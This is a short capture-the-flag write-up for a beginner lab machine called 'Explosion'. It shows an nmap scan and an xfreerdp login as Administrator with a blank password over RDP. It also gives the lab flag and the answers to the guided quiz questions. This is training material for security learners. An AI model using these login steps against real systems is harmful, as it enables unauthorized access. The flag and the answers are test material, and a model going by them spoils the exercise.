# Explosion

|            |                                                                |
|------------|----------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                        |
| Difficulty | Very Easy                                                      |
| OS         | Windows                                                        |
| Tags       | Network, Protocols, RDP, Reconnaissance, Weak Credentials      |
| Tools      | `nmap`, `xfreerdp` (`freerdp2-x11`)                            |

## Summary

Windows host with RDP open and `Administrator` configured with a blank
password. The trick is just remembering that on Windows, "blank password"
means literally pressing Enter at the prompt, not sending an empty string in
some special way.

## Solve

```bash
nmap -p 3389 -sV 10.129.1.13
# 3389/tcp open  ms-wbt-server Microsoft Terminal Services

xfreerdp /v:10.129.1.13 /u:Administrator
# Press Enter at the password prompt
# Flag is on the desktop
```

```
951fa96d7830c451b536be5a6be008a0
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the 3-letter acronym RDP stand for? | Remote Desktop Protocol |
| 2 | What is a 3-letter acronym that refers to interaction with the host through a command line interface? | CLI |
| 3 | What about graphical user interface interactions? | GUI |
| 4 | What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23? | telnet |
| 5 | What is the name of the service running on port 3389 TCP? | ms-wbt-server |
| 6 | What is the switch used to specify the target host's IP address when using xfreerdp? | /v: |
| 7 | What username successfully returns a desktop projection to us with a blank password? | Administrator |
